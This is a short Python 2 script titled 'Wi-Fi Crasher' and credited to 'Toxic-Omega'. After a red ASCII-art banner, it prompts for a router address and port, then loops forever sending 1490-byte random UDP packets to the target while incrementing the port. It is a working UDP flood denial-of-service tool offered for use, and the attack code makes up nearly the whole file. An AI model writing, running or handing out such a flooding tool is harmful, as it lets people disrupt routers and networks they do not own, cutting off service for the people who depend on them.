import os
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print("\033[31m                                            ")
print("\033[31m                      -//.                  ")
print("\033[31m                    `yddddo`                ")
print("\033[31m           -oho.   .sddddddo`   -oh+.       ")
print("\033[31m        ./ys:`/ys:odddddddddd+/yy:`/yy/`    ")
print("\033[31m      `sy/`     /ddddohsohsdddd-     .+ys`  ")
print("\033[31m           .:`  yddds++++++ydddo  `:.       ")
print("\033[31m         .ohoho/dd+s-ooooo+++odd:ohoho.     ")
print("\033[31m       .oh/` `:yddsh-ooooo++yydds:  `+ho.   ")
print("\033[31m    .`      +ssssddddhdhhdhddddssss+      `.")
print("\033[31m           +d-    .sddddddddo.  ``-d/       ")
print("\033[31m          /d-       `-///:-        :d:      ")
print("\033[31m         :d:                        /d-     ")
print("\033[31m        -d/                          +d.    ")
print("\033[31m        .:                            :-    ")
print("                                        ")
print("                 \033[32mWi-Fi Crasher             ")
print("              \033[94mCoded By Toxic-Omega         ")
print("\033[31m                                           ")
ip = raw_input("              [?] Router Address >> ")
port = input("              [?] Pouter Port >> ")

print("\033[94m")
os.system("clear")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "|Packets: %s |Ip: %s | port: %s |"%(sent,ip,port)
     if port == 65534:
       port = 1
